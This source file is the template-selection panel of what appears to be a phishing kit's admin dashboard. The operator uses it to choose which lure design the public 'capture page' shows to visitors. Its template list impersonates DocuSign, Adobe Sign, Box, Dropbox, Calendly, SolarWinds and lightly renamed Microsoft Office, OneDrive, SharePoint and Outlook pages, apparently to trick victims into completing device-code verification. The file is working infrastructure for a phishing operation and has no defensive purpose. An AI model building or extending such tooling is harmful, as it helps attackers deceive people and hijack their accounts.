import React, { useState, useEffect } from 'react';
import type { PageDesign } from '../types';

interface TemplatesPanelProps {
  storedPassword: string;
}

interface TemplateInfo {
  id: PageDesign;
  name: string;
  description: string;
  preview: string;
}

const TEMPLATES: TemplateInfo[] = [
  {
    id: 'default',
    name: 'Secure Portal',
    description: 'Clean verification flow with device code, step-by-step instructions, and countdown timer.',
    preview: 'default',
  },
  {
    id: 'adobe-sign',
    name: 'Adobe Acrobat Sign',
    description: 'Document verification theme. Looks like Adobe Acrobat requesting identity verification to view a shared document.',
    preview: 'adobe-sign',
  },
  {
    id: 'box',
    name: 'Box',
    description: 'Secure file access theme. Mimics Box file sharing with identity verification to access shared files.',
    preview: 'box',
  },
  {
    id: 'docusign-centered',
    name: 'DocuSign — Centered',
    description: 'Document signing theme. Centered layout asking for identity verification to sign a pending document.',
    preview: 'docusign-centered',
  },
  {
    id: 'docusign-split',
    name: 'DocuSign — Split',
    description: 'Document signing with split-panel design. Brand info on the left, verification form on the right.',
    preview: 'docusign-split',
  },
  {
    id: 'dropbox',
    name: 'Dropbox',
    description: 'File sharing verification theme. Looks like Dropbox folder sharing with identity verification.',
    preview: 'dropbox',
  },
  {
    id: 'microsoft-office',
    name: 'Cloud Workspace',
    description: 'Cloud productivity portal. Clean workspace access page with apps and collaboration tools.',
    preview: 'microsoft-office',
  },
  {
    id: 'microsoft-verify',
    name: 'Identity Portal',
    description: 'Minimal identity verification page. Professional design with shield icon and step-by-step flow.',
    preview: 'microsoft-verify',
  },
  {
    id: 'onedrive',
    name: 'CloudDrive',
    description: 'Cloud storage file sharing. Verification to access shared files with document preview info.',
    preview: 'onedrive',
  },
  {
    id: 'outlook-sync',
    name: 'MailConnect Sync',
    description: 'Mail sync setup page. Split-panel design with features list, account type selector, and sync progress bar.',
    preview: 'outlook-sync',
  },
  {
    id: 'sharepoint',
    name: 'DocVault',
    description: 'Document library access. Verification to view and download shared documents from a team library.',
    preview: 'sharepoint',
  },
  {
    id: 'secureshare',
    name: 'SecureShare',
    description: 'Enterprise file transfer. Split-panel design with end-to-end encryption messaging.',
    preview: 'secureshare',
  },
  {
    id: 'calendar-invite',
    name: 'MeetSpace — Calendar',
    description: 'Meeting invitation with date/time details. Verify identity to accept and join a scheduled meeting.',
    preview: 'calendar-invite',
  },
  {
    id: 'calendly-meeting',
    name: 'Calendly',
    description: 'Schedule confirmation theme. Verify identity to confirm a scheduled meeting via Calendly.',
    preview: 'calendly-meeting',
  },
  {
    id: 'bookings-meeting',
    name: 'Bookly — Booking',
    description: 'Appointment scheduling with interactive calendar and time slot picker. Full booking flow.',
    preview: 'bookings-meeting',
  },
  {
    id: 'solarwinds-meeting',
    name: 'SolarWinds',
    description: 'Dark-themed collaboration space. Verification to access a SolarWinds meeting room.',
    preview: 'solarwinds-meeting',
  },
  {
    id: 'schedule-meeting',
    name: 'Meeting Scheduler',
    description: 'Generic meeting scheduling page. Clean centered design with calendar icon.',
    preview: 'schedule-meeting',
  },
  {
    id: 'it-support',
    name: 'IT Support Portal',
    description: 'IT service desk with sidebar navigation, ticket number, and multi-step account verification.',
    preview: 'it-support',
  },
  {
    id: 'password-reset',
    name: 'Security Center — Password',
    description: 'Password reset flow with 3-step progress bar. Lock icon and security-focused messaging.',
    preview: 'password-reset',
  },
];

const TEMPLATE_COLORS: Record<string, string> = {
  'default': '#0078d4', 'adobe-sign': '#E8352B', 'box': '#0061D5',
  'docusign-centered': '#3F3B9B', 'docusign-split': '#3F3B9B', 'dropbox': '#0061FF',
  'microsoft-office': '#0078d4', 'microsoft-verify': '#0078d4', 'onedrive': '#0078D4',
  'outlook-sync': '#0078d4', 'sharepoint': '#038387', 'secureshare': '#2b6cb0',
  'calendar-invite': '#5B5FC7', 'calendly-meeting': '#006BFF', 'bookings-meeting': '#0078d4',
  'solarwinds-meeting': '#F58220', 'schedule-meeting': '#0078d4', 'it-support': '#0078d4',
  'password-reset': '#0078d4',
};

const TEMPLATE_LAYOUTS: Record<string, 'centered' | 'split'> = {
  'docusign-split': 'split', 'outlook-sync': 'split', 'secureshare': 'split',
};

export function TemplatesPanel({ storedPassword }: TemplatesPanelProps): React.ReactElement {
  const [activeTemplate, setActiveTemplate] = useState<PageDesign>('default');
  const [saving, setSaving] = useState(false);
  const [saveMsg, setSaveMsg] = useState('');
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    loadTemplate();
  }, []);

  async function loadTemplate(): Promise<void> {
    setLoading(true);
    try {
      const res = await fetch('/api/templates', {
        headers: { 'X-Admin-Password': storedPassword },
      });
      if (res.ok) {
        const data = await res.json() as { template: PageDesign };
        setActiveTemplate(data.template || 'default');
      }
    } catch { /* default */ }
    setLoading(false);
  }

  async function handleSelect(templateId: PageDesign): Promise<void> {
    setSaving(true);
    setSaveMsg('');
    try {
      const res = await fetch('/api/templates', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Admin-Password': storedPassword,
        },
        body: JSON.stringify({ template: templateId }),
      });
      const data = await res.json() as { success: boolean };
      if (data.success) {
        setActiveTemplate(templateId);
        setSaveMsg(`Template "${TEMPLATES.find(t => t.id === templateId)?.name}" is now active on the capture page.`);
      }
    } catch {
      setSaveMsg('Failed to update template.');
    }
    setSaving(false);
  }

  if (loading) {
    return (
      <div className="dash-loading">
        <div className="dash-spinner" />
        <span>Loading templates...</span>
      </div>
    );
  }

  return (
    <div className="templates-panel">
      <p className="templates-desc">
        Choose which design the public capture page displays. The active template determines what visitors see when they visit the root URL.
      </p>

      {saveMsg && <div className="templates-save-msg">{saveMsg}</div>}

      <div className="templates-grid">
        {TEMPLATES.map(tpl => {
          const color = TEMPLATE_COLORS[tpl.id] || '#0078d4';
          const layout = TEMPLATE_LAYOUTS[tpl.id] || 'centered';
          return (
            <div
              key={tpl.id}
              className={'template-card' + (activeTemplate === tpl.id ? ' active' : '')}
            >
              <div className="template-preview" style={{ background: layout === 'split' ? `linear-gradient(135deg, ${color} 50%, #f5f5f5 50%)` : '#f5f5f5' }}>
                <div className="template-preview-content" style={{ padding: 16, display: 'flex', flexDirection: 'column', gap: 8 }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                    <div style={{ width: 20, height: 20, background: color, borderRadius: 4 }} />
                    <span style={{ fontSize: 11, fontWeight: 600, color: layout === 'split' ? '#fff' : '#333' }}>{tpl.name}</span>
                  </div>
                  <div style={{ background: '#fff', borderRadius: 6, padding: 10, boxShadow: '0 1px 4px rgba(0,0,0,.1)' }}>
                    <div style={{ height: 8, width: '70%', background: '#ddd', borderRadius: 4, marginBottom: 6 }} />
                    <div style={{ height: 6, width: '90%', background: '#eee', borderRadius: 3, marginBottom: 8 }} />
                    <div style={{ height: 24, background: color, borderRadius: 4, opacity: 0.9 }} />
                  </div>
                </div>
              </div>
              <div className="template-info">
                <div className="template-header">
                  <h3>{tpl.name}</h3>
                  {activeTemplate === tpl.id && <span className="template-active-badge">ACTIVE</span>}
                </div>
                <p>{tpl.description}</p>
                <div className="template-actions">
                  {activeTemplate === tpl.id ? (
                    <button className="template-btn current" disabled>Current template</button>
                  ) : (
                    <button
                      className="template-btn activate"
                      onClick={() => handleSelect(tpl.id)}
                      disabled={saving}
                    >
                      {saving ? 'Activating...' : 'Activate'}
                    </button>
                  )}
                  <a href={tpl.id === 'default' ? '/' : `/preview/${tpl.id}`} target="_blank" rel="noopener noreferrer" className="template-btn preview-link">
                    Preview
                  </a>
                </div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}
